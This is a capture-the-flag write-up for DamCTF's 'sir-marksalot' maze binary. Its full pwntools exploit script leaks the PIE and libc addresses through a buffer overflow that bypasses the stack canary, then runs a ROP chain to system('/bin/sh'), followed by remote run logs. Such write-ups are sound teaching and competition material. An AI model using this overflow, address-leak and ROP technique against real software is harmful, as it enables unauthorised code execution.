# DamCTF 2021 

## pwn/sir-marksalot

> It's pitch black. You are likely to be eaten by a grue.
> 
> `nc chals.damctf.xyz 31313`
>
> Author: BobbySinclusto
> 
> [`sir-marksalot`](sir-marksalot)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _remote-shell_


## Summary

Please read [pwn/magic-marker](../magic-marker) first.  This is the same challenge however without ret2win, but with PIE enabled, and NX disabled (shellcode friendly).

> This solution uses a ROP chain (no shellcode), so a version of this challenge with all base mitigations in place would still fall to this exploit.
> 
> I'm not suggesting this is the best way to solve this challenge, just _a_ way without using shellcode.
>
> There's less than a 1 in 64 chance this will work per trial (retries are built into the code).

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

NX disabled/Has RWX segments = Use shellcode.

`ropper --file sir-marksalot` reveals some nice gadgets to use as well:

```
0x0000000000000990: pop rbp; ret;
0x0000000000001a03: jmp qword ptr [rbp];
```

To use these (or any ROP gadgets) we'll first have to leak the base address.

> As stated in the Summary above, I'm not going to use shellcode, but all ROP.
> 
> I'm sure the other write-ups will use shellcode, in short, the path to shellcode is a leak above the maze.


### Decompile with Ghidra

Please read [pwn/magic-marker](../magic-marker) first.  It's the same exploit, `fgets`, just with PIE enabled so we need a leak, and a lot of checking when moving _off grid_, and we'll also have a time constraint of 60 seconds, and there's no simple `q` to run our ROP chain; we'll have to find the Grue to exit the maze and run our exploit.

The time constraint is not in the code, probably how it is run on the challenge server, a simple `time nc ...` can be used to determine the time constraint.


## Exploit

In short, like [pwn/magic-marker](../magic-marker) we'll get to the lower right corner, then bust out of the maze and move East to write out a ROP chain while not messing with the canary.  This is no simple task and will require checks and retries.  Then we have to backtrack back to the maze and find the Grue (quickly, IOW we cannot search, we have to _know_).  On Grue our ROP chain will execute.

We have to do this twice.  The first time is to leak libc, then second time for the shell.

> There may be better single pass methods where libc can be leaked with the base address, but I didn't find one; I was also in a hurry (its a CTF after all, more to pwn).

To optimize for time we need to _fail fast_.

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./sir-marksalot')

while True:
    context.log_level = 'INFO'

    if args.REMOTE:
        p = remote('chals.damctf.xyz', 31314)
        libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
        binary.address = libc.address = 0
    else:
        p = process(binary.path)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        binary.address = libc.address = 0
```

Standard pwntools header, however in a loop (`while True:`).  There are numerous conditions that need to be checked, if the condition is not met we start over.  We will require more moves than a shellcode solution.  There's only a 1 in 64 chance this will work on any attempt.

> libc is required for the 2nd ROP chain, and is not included (not needed for shellcode).  To find libc I had to leak libc first and then use an online libc database.  Fortunately there was only one match for the libc leak: [`https://libc.blukat.me/d/libc6_2.27-3ubuntu1.4_amd64.so`]()

```python
    # pass 1
    from ctypes import *
    glibc = cdll.LoadLibrary('libc.so.6')
    glibc.srand(glibc.time(None))

    log.info('pass 1')
    t = time.time()

    # get started
    p.sendlineafter(b'?\n',b'jump up and down')

    # find myself (array base 1)
    p.sendlineafter(b'): ',b'm')
    x = y = 0

    for i in range(81):
        _ = p.recvline().strip()
        if b'|' in _:
            y += 1
        if b'*' in _:
            x = (2 + _.find(b'*')) // 4
            break

    # check we have a match for the seed
    dy = glibc.rand() % 0x28
    dx = glibc.rand() % 0x28
    log.info('rand {dx},{dy}'.format(dx = dx + 1, dy = dy + 1))
    if x != dx + 1 or y != dy + 1:
        log.critical('rand mismatch')
        p.close()
        continue
```

In this first section of code we get the time from libc, start our own timer for time checks (just information to make sure we're under 60 seconds), find ourself in the maze, then compute using the same logic as in the code where we should be, finally we compare where we should be with where we are.  If there's a match, then we have the correct rand seed.

```python
    gy = glibc.rand() % 0x28
    gx = glibc.rand() % 0x28
    log.info('grue at {gx},{gy}'.format(gx = gx + 1, gy = gy + 1))

    # lazy, not covering "edge" cases
    if gx == 39 or gy == 39:
        log.critical('grue on edge')
        p.close()
        continue

    # kick down the walls and get to the lower right avoiding grue
    if gx == dx:
        for i in range(40 - x):
            p.sendlineafter(b'): ', b'x')
            p.sendafter(b'?\n', 0x20 * b'\xff')
            p.sendlineafter(b'): ', b'd')

    for j in range(40 - y):
        p.sendlineafter(b'): ', b'x')
        p.sendafter(b'?\n', 0x20 * b'\xff')
        p.sendlineafter(b'): ', b's')

    if gx != dx:
        for i in range(40 - x):
            p.sendlineafter(b'): ', b'x')
            p.sendafter(b'?\n', 0x20 * b'\xff')
            p.sendlineafter(b'): ', b'd')

    log.info('time check: {s}s'.format(s = time.time() - t))
```

With the rand seed confirmed we can move on and compute the location of the Grue.

> It's important to follow the code and check all calls to `rand()` so that you call them in the correct order in your exploit code.

With the location of the Grue known we can move to the lower right corner without prematurely ending our run with a Grue collision.

> Above I ignored the cases were the Grue was on the lower right corner, or started where we started, or if both of us were on an edge.  For the edge cases, I just started over.
            
```python
    # lets bust out of here, return to the east
    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', 0x20 * b'\xff')
    p.sendlineafter(b'): ', b'd')

    # canary block, cannot change, but can check for East/West
    _ = p.recvuntil(b'What would you like')
    if b'West' not in _:
        log.critical('cannot backtrack 4')
        p.close()
        continue
    if b'East' not in _:
        log.critical('cannot forwardtrack 2')
        p.close()
        continue
```

Just like [pwn/magic-marker](../magic-marker), we move East `0x20` bytes at a time with the ability to change all `0x20` bytes, and just like [pwn/magic-marker](../magic-marker) we skip over the canary, however this time we'll read a specific block first before overwriting it to get a base address leak.

> Note the checks for East/West movement.  From the tile/block with the canary there's a stack pointer on the stack line that contains the wall nibble.  We cannot check directly, but the game will check for us.  It is required that we have both East and West movement to move forward and eventually back.  With a 50/50 probability of each bit being set there's only a 1 in 4 chance of making it past this check.

Stack just before `fgets` (in next code block below):

```
0x00007fff43a62280│+0xc800: 0xffffffffffffffff
0x00007fff43a62288│+0xc808: 0xffffffffffffffff
0x00007fff43a62290│+0xc810: 0xffffffffffffffff
0x00007fff43a62298│+0xc818: 0xffffffffffffffff

0x00007fff43a622a0│+0xc820: 0x0000000000000100
0x00007fff43a622a8│+0xc828: 0x3355a9ac1aa38c00
0x00007fff43a622b0│+0xc830: 0x000056280c8015d8  →  "Oh no! The ground gives way and you fall into a da[...]"
0x00007fff43a622b8│+0xc838: 0x00007fff43a622f0  →  "jump up and down\n"

0x00007fff43a622c0│+0xc840: 0x000056280c801217  →  "jump up and down\n"	 ← $rdi, $r13
0x00007fff43a622c8│+0xc848: 0x000056280c8011fc  →  "I'm not sure I understand."
0x00007fff43a622d0│+0xc850: 0x00007fff43a62420  →  0x0000000000000001
0x00007fff43a622d8│+0xc858: 0x0000000000000000

0x00007fff43a622e0│+0xc860: 0x0000000000000000
0x00007fff43a622e8│+0xc868: 0x000056280c80090d  →  <main+173> xor eax, eax
```

Above you can see the `0x20 * b'\xff'` write from the previous code block, followed by a 32-byte block with the canary, followed by a block starting with location within the base process (the static string `jump up and down\n`).  This will be leaked after `On the wall is written: ` is emitted.  Once we have this, it is safe to destroy.


```python
    p.sendlineafter(b'): ', b'd')
    p.recvuntil(b'On the wall is written: ')

    leak = u64(p.recv(6) + b'\0\0')
    log.info('leak: {leak}'.format(leak = hex(leak)))
    binary.address = leak - binary.search(b'jump up and down\n').__next__()
    log.info('binary.address: {loc}'.format(loc = hex(binary.address)))

    pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

    payload1  = b''
    payload1 += 8 * b'\xff'
    payload1 += p64(pop_rdi)
    payload1 += p64(binary.got.puts)
    payload1 += p64(binary.plt.puts)
    if payload1.find(b'\n') != -1:
        log.critical('NL in payload 1')
        p.close()
        continue
    if payload1[28] & 1 == 0:
        log.critical('cannot backtrack 2')
        p.close()
        continue
    if payload1[28] & 4 == 0:
        log.critical('cannot forwardtrack 4')
        p.close()
        continue

    payload2  = b''
    payload2 += p64(binary.sym.main)
    payload2 += 8 * b'\xff'
    payload2 += 8 * b'\xff'
    payload2 += 8 * b'\xff'
    if payload2.find(b'\n') != -1:
        log.critical('NL in payload 2')
        p.close()
        continue
```

After getting the base process leak we can compute both parts of the ROP chain and check if either have any NLs (will terminate `fgets` early), and if `payload1`'s 28th byte (the wall nibble) will allow East/West movement.  If any of these checks fail, then we'll have to start over.  Ignoring the probably of NLs (small), like the canary block probability, we have a 1 in 4 chance of having the correct bits set.  The combined probably of getting past this point is 1 in 16.

```python
    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', 0x20 * b'\xff')
    p.sendlineafter(b'): ', b'd')

    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', payload1)
    p.sendlineafter(b'): ', b'd')

    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', payload2)
    p.sendlineafter(b'): ', b'a')

    p.sendlineafter(b'): ', b'a')
    p.sendlineafter(b'): ', b'a')
    p.sendlineafter(b'): ', b'a')

    log.info('time check: {s}s'.format(s = time.time() - t))
```

After writing out our ROP chain to leak libc, we'll have to backtrack out by going West.  At this point we know if it is possible to forward/backtrack based on the previous tests, so just move forward, write out ROP chains, then return back to the lower right corner of the maze.

```
    # kick down walls to the grue
    for i in range(39 - gx):
        p.sendlineafter(b'): ', b'x')
        p.sendafter(b'?\n', 0x20 * b'\xff')
        p.sendlineafter(b'): ', b'a')

    for j in range(39 - gy):
        p.sendlineafter(b'): ', b'x')
        p.sendafter(b'?\n', 0x20 * b'\xff')
        p.sendlineafter(b'): ', b'w')

    log.info('time check: {s}s'.format(s = time.time() - t))

    p.recvuntil(b'Grue.\n')

    leak = u64(p.recv(6) + b'\0\0')
    log.info('leak: {leak}'.format(leak = hex(leak)))
    libc.address = leak - libc.sym.puts
    log.info('libc.address: {loc}'.format(loc = hex(libc.address)))

    payload1  = b''
    payload1 += 8 * b'\xff'
    payload1 += p64(pop_rdi+1)
    payload1 += p64(pop_rdi)
    payload1 += p64(libc.search(b'/bin/sh').__next__())
    if payload1.find(b'\n') != -1:
        log.critical('NL in payload 1')
        p.close()
        continue
    if payload1[28] & 4 == 0:
        log.critical('cannot forwardtrack 4')
        p.close()
        continue
    if payload1[28] & 1 == 0:
        log.critical('cannot backtrack 2')
        p.close()
        continue

    payload2  = b''
    payload2 += p64(libc.sym.system)
    payload2 += 8 * b'\xff'
    payload2 += 8 * b'\xff'
    payload2 += 8 * b'\xff'
    if payload2.find(b'\n') != -1:
        log.critical('NL in payload 2')
        p.close()
        continue
```

Once back to the lower right corner we can just head to the Grue, that will trigger our ROP chain and leak libc.

With libc location known, we can quickly check if the 2nd pass ROP chain will be able to track forward and back.  Again another 1/4 chance, moving our total chance for success/attempt 1 in 32.

```
    # pass 2
    glibc = cdll.LoadLibrary('libc.so.6')
    glibc.srand(glibc.time(None))
    
    log.info('pass 2')

    # get started
    p.sendlineafter(b'?\n',b'jump up and down')

    # find myself (base 1)
    p.sendlineafter(b': ',b'm')
    x = y = 0
    for i in range(80):
        _ = p.recvline().strip()
        if b'|' in _:
            y += 1
        if b'*' in _:
            x = (2 + _.find(b'*')) // 4
            break

    log.info('x,y = {x},{y}'.format(x = x, y = y))
    if x == 0:
        log.critical('no * to be found')
        p.close()
        continue

    # check we have a match for the seed
    dy = glibc.rand() % 0x28
    dx = glibc.rand() % 0x28
    log.info('rand {dx},{dy}'.format(dx = dx + 1, dy = dy + 1))
    if x != dx + 1 or y != dy + 1:
        log.critical('rand mismatch')
        p.close()
        continue

    gy = glibc.rand() % 0x28
    gx = glibc.rand() % 0x28
    log.info('grue at {gx},{gy}'.format(gx = gx + 1, gy = gy + 1))

    # lazy, not covering "edge" cases
    if gx == 39 or gy == 39:
        log.critical('grue on edge')
        p.close()
        continue

    # kick down the walls and get to the lower right avoiding grue
    if gx == dx:
        for i in range(40 - x):
            p.sendlineafter(b'): ', b'x')
            p.sendafter(b'?\n', 0x20 * b'\xff')
            p.sendlineafter(b'): ', b'd')

    for j in range(40 - y):
        p.sendlineafter(b'): ', b'x')
        p.sendafter(b'?\n', 0x20 * b'\xff')
        p.sendlineafter(b'): ', b's')

    if gx != dx:
        for i in range(40 - x):
            p.sendlineafter(b'): ', b'x')
            p.sendafter(b'?\n', 0x20 * b'\xff')
            p.sendlineafter(b'): ', b'd')

    log.info('time check: {s}s'.format(s = time.time() - t))

    # lets bust out of here, return to the east
    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', 0x20 * b'\xff')
    p.sendlineafter(b'): ', b'd')

    # canary block, cannot change, but can check for East/West
    _ = p.recvuntil(b'What would you like')
    if b'West' not in _:
        log.critical('cannot backtrack 4')
        p.close()
        continue
    if b'East' not in _:
        log.critical('cannot forwardtrack 2')
        p.close()
        continue
```

The 2nd pass starts out not much different from the 1st pass, it was a cut/paste job.  A new rand seed is generated, etc...

> I could have just jumped back to `play_maze`, and kept the old seed, but timewise it really will not matter much.  I guess less of a chance with a 2nd rand mismatch.  It was already tested code, so I didn't bother.

At the start of the 2nd pass we know that our new ROP chain will not have any East/West movement problems or NLs.  At this point there's a 1 in 4 chance it will succeed, i.e. the canary block.  If this passes, then we will get a shell, IFF we do not run out of time.  If the Grue and/or the player (us) is in the upper left corner area, then we could run out of time:

```
[*] pass 2
[*] x,y = 25,6
[*] rand 25,6
[*] grue at 6,22
[*] time check: 47.19852542877197s
[*] time check: 48.53908085823059s
```

> The player (us) and Grue are a ways away from 40, 40.  This trial ran out of time.

The combined probability of getting this far is 1 in 64.

```
    p.sendlineafter(b'): ', b'd')

    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', 0x20 * b'\xff')
    p.sendlineafter(b'): ', b'd')

    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', payload1)
    p.sendlineafter(b'): ', b'd')

    p.sendlineafter(b'): ', b'x')
    p.sendafter(b'?\n', payload2)
    p.sendlineafter(b'): ', b'a')

    p.sendlineafter(b'): ', b'a')
    p.sendlineafter(b'): ', b'a')
    p.sendlineafter(b'): ', b'a')

    log.info('time check: {s}s'.format(s = time.time() - t))

    # kick down walls to the grue
    for i in range(39 - gx):
        p.sendlineafter(b'): ', b'x')
        p.sendafter(b'?\n', 0x20 * b'\xff')
        p.sendlineafter(b'): ', b'a')
        if time.time() - t >= 59: break
    if time.time() - t >= 59:
        log.critical('out of time')
        p.close()
        continue

    for j in range(39 - gy):
        p.sendlineafter(b'): ', b'x')
        p.sendafter(b'?\n', 0x20 * b'\xff')
        p.sendlineafter(b'): ', b'w')
        if time.time() - t >= 59: break
    if time.time() - t >= 59:
        log.critical('out of time')
        p.close()
        continue

    log.info('time check: {s}s'.format(s = time.time() - t))

    p.recvuntil(b'Grue.\n')
    break

#p.interactive()
p.sendline(b'cat flag')
print(p.recvline().strip().decode())
```

The rest is downhill assuming we do not run out of time.  Like before the ROP chain will be written out, the Grue found, and the chain executed.
  
Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/damctf2021/sir-marksalot/sir-marksalot'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chals.damctf.xyz on port 31314: Done
[*] '/pwd/datajerk/damctf2021/sir-marksalot/libc6_2.27-3ubuntu1.4_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] pass 1
[*] rand 17,22
[CRITICAL] rand mismatch
[*] Closed connection to chals.damctf.xyz port 31314
[+] Opening connection to chals.damctf.xyz on port 31314: Done
[*] pass 1
[*] rand 38,24
[*] grue at 36,2
[*] time check: 3.4693713188171387s
[*] leak: 0x55cdfc1d1217
[*] binary.address: 0x55cdfc1d0000
[*] time check: 4.648568630218506s
[*] time check: 12.33139157295227s
[*] leak: 0x7fad54c72aa0
[*] libc.address: 0x7fad54bf2000
[*] pass 2
[*] x,y = 29,31
[*] rand 29,31
[*] grue at 2,31
[*] time check: 16.73600125312805s
[*] time check: 18.195335865020752s
[*] time check: 27.541880130767822s
dam{1n73N710N4LLy_93771n9_3473n_8y_4_9rU3-7H47_w42_9Ru3S0M3}
```

I know what you're thinking, I cherry picked that.  We'll I didn't, this was pure luck.

Number of retries per run:

```
run1:1
run2:39
run3:4
run4:17
run5:21
```

So doing a bit better than 1 in 64.

There was one run (omitted) that timed out (took longer than 60 seconds).

There was a few runs that bombed out.  Probably a network error (I didn't try to catch them).

Error counts:

```
     35 [CRITICAL] cannot backtrack 4
     15 [CRITICAL] cannot forwardtrack 4
     15 [CRITICAL] cannot backtrack 2
     13 [CRITICAL] rand mismatch
      4 [CRITICAL] grue on edge
```

`cannot backtrack 4` comes from the first coin flip.  It's not surprising it is the most frequent and exactly 1/2 of the 70 (65 retries + 5 passed) trials that did not restart on `rand mismatch` or `grue on edge` (both of these are early failures).  `forwardtrack 4` and `backtrack 2` are from the ROP chains first block.  Also not surprising, of the 35 trials that made it through, it was expected that ~1/2 would fail with `forwardtrack 4` and ~1/2 would fail with `cannot backtrack 2`  I didn't label the first or second ROP chains differently, but with the magic of editing the logs, I can:

```
     35 [CRITICAL] cannot backtrack 4
     14 [CRITICAL] cannot backtrack 2
     13 [CRITICAL] rand mismatch
     11 [CRITICAL] cannot forwardtrack 4
      4 [CRITICAL] grue on edge
      4 [CRITICAL] cannot forwardtrack 4 libc
      1 [CRITICAL] cannot backtrack 2 libc
```

These numbers are not surprising given how many checks force a restart.       
